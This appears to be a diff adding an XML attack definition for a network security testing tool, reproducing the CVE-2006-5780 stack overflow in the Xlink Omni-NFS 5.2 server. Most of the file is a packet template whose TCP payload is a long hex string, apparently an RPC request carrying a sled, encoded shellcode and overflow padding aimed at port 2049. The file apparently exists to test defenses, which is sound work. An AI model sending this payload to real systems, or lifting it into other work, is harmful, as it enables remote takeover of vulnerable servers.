@@ -1,0 +1,79 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Omni-NFS Stack Overflow"/>
+    <EngDesc display="true" value="This threat attacks a stack based overflow in the Omni-NFS server available for windows.  This attack goes to port 2049 typically."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Unauthorized_Use"/>
+    </Intent>
+    <Protocol display="true" value="Proprietary"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Xlink"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Xlink_Omni-NFS"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Xlink_Omni-NFS_5.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securityfocus.com/archive/1/archive/1/450728/100/0/threaded"/>
+    <CVEID display="true" value="CVE-2006-5780"/>
+    <bugtraqID display="true" value="20941"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="0d8ebcbf80e67cc4d74085562231f86a"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632991219581250000"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1163543655" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="ProprietarydestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="F">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="F" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$ProprietarydestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="80000348000000010000000000000002000186A5000000010000000100000001000001904D4D4D4D4D4D4D4D4D423740904F274791462F9891429B933F414AFD3F969F42D6979B47D642F996D69242F8D64A439248FD929149FD4FF99193474E4727913FF94B2741964737FC404F46F9984A90D6F593499F27374A374F4A9398F5426A5059D9EED97424F45B8173133E52BA4E83EBFCE2F4C2385103D6AB45B1C13231221A76310B02D9C64B465355C5714A31111E535107B566314FD0637AD792D67A3A399370433F9051BA05069E664BB731111A535128B55EF1C5614EBBA53D7E31C75276A62FFD63612AB5118AC57E5E313E22FF310E360CD2C0705C561EC184DC1D583A897C5625C97C6106459E569957B20502459861DB5F28BFBFB24C6B38B8B1EE3A6347CBFFEDB1E801E91D6D01F91D7D01459E583AAB12580133AFAB3A1E544E95EDB1E838AA1F6BAD6A269AFF94A769AD6C1D6BAD6A26DB1B3C0769AD6C1E6A06EFB1EEC1D2A94794C319C184EFB1EE34D02A583AD923B7B7D01E677B76C7D938FEC7DC637ABD94ACF863C01096DDB32882E595F9D23CC0E1ACB14B1645986505E81F6F03D04F6F03EF1FC182D2E30000000100000190E757741DC184D0B1C165459EB50546CDFA3645986CAD6A26CED8BE116DAD6CB1EE52BA4E4D4D4D2D43184000E917FBFFFF454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
